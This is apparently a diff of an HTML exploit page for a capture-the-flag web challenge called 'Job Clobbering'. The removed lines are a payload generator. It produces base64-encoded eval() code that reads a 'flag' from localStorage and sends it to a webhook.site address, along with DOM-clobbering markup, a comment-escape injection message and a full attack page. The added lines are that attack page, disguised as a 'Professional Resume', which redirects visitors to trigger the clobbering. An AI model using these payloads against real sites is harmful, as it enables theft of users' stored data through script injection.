@@ -1,124 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Payload Generator for Job Clobbering CTF</title>
+    <title>Professional Resume</title>
     <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; }
-        textarea { width: 100%; height: 100px; margin: 10px 0; font-family: monospace; }
-        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
-        .output { background: #f0f0f0; padding: 15px; margin: 10px 0; word-break: break-all; }
-        .code { background: #333; color: #0f0; padding: 10px; font-family: monospace; }
-    </style>
 </head>
 <body>
-    <h1>Base64 Payload Generator</h1>
-    
-    <h2>Method 1: Data URL with eval() - Like Your Classmate</h2>
-    <p>This method works because CSP allows 'unsafe-eval' and data: URLs from 'self'</p>
-    
-    <label>Your Webhook URL:</label>
-    <input type="text" id="webhook" value="https://webhook.site/c02e533c-209c-4f92-a472-793c0fa62dd8" style="width: 100%; padding: 5px;" />
-    
-    <button onclick="generateDataUrlPayload()">Generate Data URL Payload</button>
-    
-    <h3>Generated HTML to put in attack page:</h3>
-    <div class="output">
-        <pre id="dataUrlOutput" class="code"></pre>
-    </div>
-    
-    <h3>Complete attack page:</h3>
-    <textarea id="fullAttackPage"></textarea>
-    <button onclick="copyToClipboard('fullAttackPage')">Copy Full Attack Page</button>
-    
-    <hr>
-    
-    <h2>Method 2: Two-Message Attack (Your Original Method)</h2>
-    <p>Post these two messages on the challenge site:</p>
-    
-    <h3>Message 1 (JavaScript):</h3>
-    <div class="output">
-        <pre id="jsMessageOutput" class="code"></pre>
-    </div>
-    <button onclick="copyToClipboard('jsMessageOutput')">Copy</button>
-    
-    <h3>Message 2 Name field (DOM Clobber):</h3>
-    <div class="output">
-        <pre id="domClobberOutput" class="code"></pre>
-    </div>
-    <button onclick="copyToClipboard('domClobberOutput')">Copy</button>
+    <h1>Redirecting to portfolio...</h1>
+    <p>Please wait while we load the interactive portfolio.</p>
     
     <script>
-        function generateDataUrlPayload() {
-            const webhook = document.getElementById('webhook').value;
-            
-            // JavaScript code to steal the flag
-            const jsCode = `try{var flag=localStorage.getItem("flag");var img=new Image();img.src="${webhook}?flag="+encodeURIComponent(flag)+"&t="+Date.now()}catch(e){}`;
-            
-            // Base64 encode it
-            const base64 = btoa(jsCode);
-            
-            // Create the data URL payload
-            const dataUrl = `data:text/javascript,eval(atob('${base64}'))`;
-            
-            // HTML for DOM clobbering
-            const domClobberHtml = `<div id="utilsJS">
-    <div id="url">${dataUrl}</div>
-</div>`;
-            
-            document.getElementById('dataUrlOutput').textContent = domClobberHtml;
-            
-            // Generate full attack page
-            const fullPage = `<!DOCTYPE html>
-<html>
-<head>
-    <title>Resume</title>
-</head>
-<body>
-    ${domClobberHtml}
-    
-    <h1>Professional Resume</h1>
-    <p>Loading portfolio...</p>
-    
-    <script>
-        // Update with correct challenge URL
+        // IMPORTANT: Update this to match your actual challenge URL
         const CHALLENGE_URL = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club';
+        // Alternative URL if the above doesn't work:
+        // const CHALLENGE_URL = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
+        
+        console.log('[ATTACK] Simple redirect attack starting...');
+        console.log('[ATTACK] Will redirect to:', CHALLENGE_URL + '/#messages');
+        
+        // Wait a moment then redirect to trigger the DOM clobbering
         setTimeout(() => {
+            console.log('[ATTACK] Redirecting now...');
             window.location.replace(CHALLENGE_URL + '/#messages');
-        }, 2000);
-    </scr' + 'ipt>
-</body>
-</html>`;
-            
-            document.getElementById('fullAttackPage').value = fullPage;
-            
-            // Also generate Method 2 payloads
-            const jsMessage = `*/(new Image).src="${webhook}?flag="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")+"&t="+Date.now()//`;
-            const domClobber = `<div id="utilsJS"><div id="url">/messages?id=2</div></div>`;
-            
-            document.getElementById('jsMessageOutput').textContent = jsMessage;
-            document.getElementById('domClobberOutput').textContent = domClobber;
-        }
-        
-        function copyToClipboard(elementId) {
-            const element = document.getElementById(elementId);
-            const text = element.tagName === 'TEXTAREA' ? element.value : element.textContent;
-            
-            navigator.clipboard.writeText(text).then(() => {
-                alert('Copied to clipboard!');
-            }).catch(err => {
-                // Fallback
-                if (element.tagName === 'TEXTAREA') {
-                    element.select();
-                    document.execCommand('copy');
-                } else {
-                    alert('Please select and copy manually');
-                }
-            });
-        }
-        
-        // Generate on load
-        generateDataUrlPayload();
+        }, 1500);
     </script>
 </body>
 </html>
